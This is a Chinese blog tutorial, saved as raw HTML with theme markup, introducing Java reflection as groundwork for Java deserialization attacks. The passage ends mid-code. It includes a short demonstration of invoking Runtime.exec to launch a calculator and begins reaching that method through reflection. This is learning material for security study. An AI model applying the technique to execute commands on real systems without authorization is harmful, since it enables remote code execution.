<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url">Java反序列化</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Java反序列化</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Java反序列化1入门</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-12-09T08:41:59.654Z" title="发表于 2023-12-09 16:41:59">2023-12-09</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-04-23T12:46:57.026Z" title="更新于 2024-04-23 20:46:57">2024-04-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">12.8k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>49分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Java反序列化1入门"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/12/09/java-fan-xu-lie-hua-1/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/12/09/java-fan-xu-lie-hua-1/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/12/09/java-fan-xu-lie-hua-1/"><header><a class="post-meta-categories" href="/categories/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url">Java反序列化</a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" tabindex="-1" itemprop="url">Java反序列化</a><h1 id="CrawlerTitle" itemprop="name headline">Java反序列化1入门</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-12-09T08:41:59.654Z" title="发表于 2023-12-09 16:41:59">2023-12-09</time><time itemprop="dateCreated datePublished" datetime="2024-04-23T12:46:57.026Z" title="更新于 2024-04-23 20:46:57">2024-04-23</time></header><h1 id="0x01-前言">0x01 前言</h1>
<p>如今CTF比赛中难题或者是压轴题都涉及到Java知识，可见Java安全的火爆程度，如今看了小迪的涉及到Java反序列化1的课程，也想着是时候初步学习一下了。故此文章用来入门Java反序列化1，后续遇到新知识在写吧。</p>
<h1 id="0x02-java反射">0x02 Java反射</h1>
<p>跟着师傅的路线先了解一下Java反射</p>
<h2 id="java正射">Java正射</h2>
<p>例子，这是一个person类，有成员变量以及函数：</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> 反射;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>{
        System.out.println(<span class="hljs-string">"hello"</span>);
    }
}</code></pre>
<p>我们在编写代码时，当需要使用到某一个类的时候，都会先了解这个类是做什么的。然后实例化这个类，接着用实例化好的对象进行操作，这就是正射。</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> 反射;
<span class="hljs-keyword">import</span> 反射.Person;
<span class="hljs-keyword">public</span> class 正射 {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();
        person1.setName(<span class="hljs-string">"小明"</span>);
        person1.setAge(<span class="hljs-number">18</span>);
        System.out.println(person1.getName());
        System.out.println(person1.getAge());
        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> person1.getClass();<span class="hljs-comment">//Class 类的对象作用是运行时提供或获得某个对象的类型信息。</span>
        System.out.println(c);
        person1.show();
    }
}</code></pre>
<h2 id="java反射机制">Java反射机制</h2>
<p>Java反射(<code>Reflection</code>)是Java非常重要的动态特性，通过使用反射我们不仅可以获取到任何类的成员方法(<code>Methods</code>)、成员变量(<code>Fields</code>)、构造方法(<code>Constructors</code>)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。Java反射机制是Java语言的动态性的重要体现，也是Java的各种框架底层实现的灵魂。</p>
<h2 id="java-反射组成相关的类">Java 反射组成相关的类</h2>
<p>反射机制相关操作一般位于java.lang.reflect包中，而java反射机制组成需要重点注意以下的类：</p>
<ul>
<li>java.lang.Class：类对象;</li>
<li>java.lang.reflect.Constructor：类的构造器对象;</li>
<li>java.lang.reflect.Field：类的属性对象;</li>
<li>java.lang.reflect.Method：类的方法对象;</li>
</ul>
<p>反射调用方法：</p>
<ul>
<li>获取类的方法：forName</li>
<li>实例化类对象的方法：newInstance</li>
<li>获取函数的方法：getMethod</li>
<li>执行函数的方法：invoke</li>
</ul>
<h2 id="获取class对象">获取Class对象</h2>
<p>Class 类是描述类的类，作用是运行时提供或获得某个对象的类型信息。</p>
<p>获取类的实例有以下的三种方法：</p>
<ul>
<li>方法一、实例化对象的getClass()方法</li>
</ul>
<p>如果上下⽂中存在某个类的实例 obj，那么我们可以通过 obj.getClass 来获取它的类。</p>
<pre><code class="hljs scss">TestReflection testReflection = new <span class="hljs-built_in">TestReflection</span>();
Class class1 = testReflection<span class="hljs-selector-class">.getClass</span>();</code></pre>
<ul>
<li>方法二、 使用类的 .class 方法</li>
</ul>
<p>如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个⽅法其实不属于反射。</p>
<pre><code class="hljs scss">Class class2 = TestReflection<span class="hljs-selector-class">.class</span>;</code></pre>
<ul>
<li>方法三、Class.forName(String className)：动态加载类</li>
</ul>
<p>如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</p>
<pre><code class="hljs scss">Class class3 = Class<span class="hljs-selector-class">.forName</span>("reflection.TestReflection");</code></pre>
<p>我们可以写个简单的示例代码，分别利用这三种方法获取当前类Class对象的当前类名。</p>
<p>此外还有一种获取类class的方法：<code>classLoader.loadClass("com.anbai.sec.classloader.TestReflection");</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> 反射;
<span class="hljs-keyword">import</span> 反射.Person;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception{
        <span class="hljs-comment">// 类的 .class 属性</span>
        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Person.class;
        System.out.println(c1.getName());

        <span class="hljs-comment">// 实例化对象的 getClass() 方法</span>
        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();
        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> person.getClass();
        System.out.println(c2.getName());

        <span class="hljs-comment">// Class.forName(String className): 动态加载类</span>
        <span class="hljs-type">Class</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"反射.Person"</span>);
        System.out.println(c3.getName());

    }
}</code></pre>
<p>我们一般使用第三种通过Class.forName方法去动态加载类。且使用forName就不需要import导入其他类，可以加载我们任意的类。</p>
<p>而使用类.class属性，需要导入类的包，依赖性太强，在大型项目中容易抛出编译错误；</p>
<p>而使用实例化对象的getClass()方法，需要本身创建一个对象，本身就没有了使用反射机制意义。</p>
<p>所以我们在获取class对象中，一般使用Class.forName方法去获取。</p>
<h2 id="反射常用函数">反射常用函数</h2>
<ul>
<li>getMethod()方法获取的是当前类中所有公共(public)方法。包括从父类里继承来的方法。</li>
<li>getDeclaredMethod()系列方法获取的是当前类中“声明”的方法，包括private，protected 和public，不包含从父类继承来的方法。</li>
<li>getConstructor()方法获取的是当前类声明为公共(public)构造函数实例。</li>
<li>getDeclaredConstructor()方法获取的是当前类声明的构造函数实例，包括private， protected和public。</li>
<li>setAccessible()在获取到私有方法或构造方法后，使用 setAccessible(true)，改变其作用域，这样即使是私有的属性，方法，构造函数也都可以访问调用了</li>
<li>newInstance()将获取到的对象实例化。调用的是这个类的无参构造函数。使用 newInstance 不成功的话可能是因为：①、你使用的类没有无参构造函数，②、你使用的类构造函数是私有的。</li>
<li>invoke()调用包装在当前Method对象中的方法。</li>
</ul>
<h2 id="通过反射创建类对象">通过反射创建类对象</h2>
<p>通过反射创建类对象主要有两种方式：通过 Class 对象的 newInstance() 方法、通过 Constructor 对象的 newInstance() 方法。</p>
<p>第一种：通过 Class 对象的 newInstance() 方法。</p>
<pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> Apple.class;
<span class="hljs-type">Apple</span> <span class="hljs-variable">apple</span> <span class="hljs-operator">=</span> (Apple)clz.newInstance();</code></pre>
<p>第二种：通过 Constructor 对象的 newInstance() 方法</p>
<pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> Apple.class;
<span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clz.getConstructor();
<span class="hljs-type">Apple</span> <span class="hljs-variable">apple</span> <span class="hljs-operator">=</span> (Apple)constructor.newInstance();</code></pre>
<p>通过 Constructor 对象创建类对象可以选择特定构造方法，而通过 Class 对象则只能使用默认的无参数构造方法。下面的代码就调用了一个有参数的构造方法进行了类对象的初始化。</p>
<pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> Apple.class;
<span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clz.getConstructor(String.class, <span class="hljs-type">int</span>.class);
<span class="hljs-type">Apple</span> <span class="hljs-variable">apple</span> <span class="hljs-operator">=</span> (Apple)constructor.newInstance(<span class="hljs-string">"红富士"</span>, <span class="hljs-number">15</span>);</code></pre>
<h3 id="newinstance">newInstance()</h3>
<p>该方法属于 <code>Class</code> 类，执行后返回一个 <code>Object</code>，可以利用这个方法来实例化对应的类，作用就是调用这个类的无参构造函数。但要求要实例化的类必须要有无参构造函数，并且这个构造函数不是私有的。</p>
<p><strong>Runtime类的分析</strong></p>
<p>进入 <code>Runtime</code> 类中可以看到</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309215924878.png" alt="image-20240309215924878"></p>
<p>这里可以看到Runtime类为单例模式，这意味着我们只能通过getRuntime方法来获取Runtime对象。同时注意 <code>getRuntime</code> 对象是静态方法，即可以直接通过 <code>类名.方法名</code> 的方法调用。</p>
<p>java执行命令</p>
<pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<span class="hljs-comment">//获取 Runtime 对象</span>
run.exec(<span class="hljs-string">"calc"</span>);<span class="hljs-comment">//执行calc命令弹出计算器</span></code></pre>
<h3 id="getmethod">getMethod()</h3>
<p>该方法可获取一个 <code>Method</code> 对象，即获取类中的方法，通常要和 <code>invoke()</code> 方法一起使用，这里重点关注下它的各项参数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309220122889.png" alt="image-20240309220122889"></p>
<p>第一个参数name是所要获取方法的方法名，第二个参数parameterTypes是所获得的方法中参数的类型，<code>parameterTypes</code> 是个 Class 类型的数组，用的是java的<strong>可变长参数</strong>的写法，<code>&lt;?&gt;</code> 是泛型的表示，这里不探讨。</p>
<p>即参数类型 <code>Class&lt;?&gt;... parameterTypes</code> 其实等价于 <code>Class&lt;?&gt;[] parameterTypes</code> 。传递的对应参数是所获取方法的对应的参数类型。比如 <code>Runtime</code> 中的 <code>exec(String command)</code> 函数，获取它就是</p>
<pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"java.lang.Runtime"</span>);
<span class="hljs-type">Method</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">"exec"</span>, String.class);</code></pre>
<h3 id="invoke">Invoke()</h3>
<p><code>invoke()</code> 方法用于执行 <code>getMethod</code> 获取的方法，看看它的相关参数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309220307513.png" alt="image-20240309220307513"></p>
<p>第一个参数是函数所在的类对象，第二个是所执行的函数的对象参数：依旧拿 <code>exec(String command)</code> 方法来说</p>
<pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<span class="hljs-comment">//获取Runtime对象</span>
<span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"java.lang.Runtime"</span>);
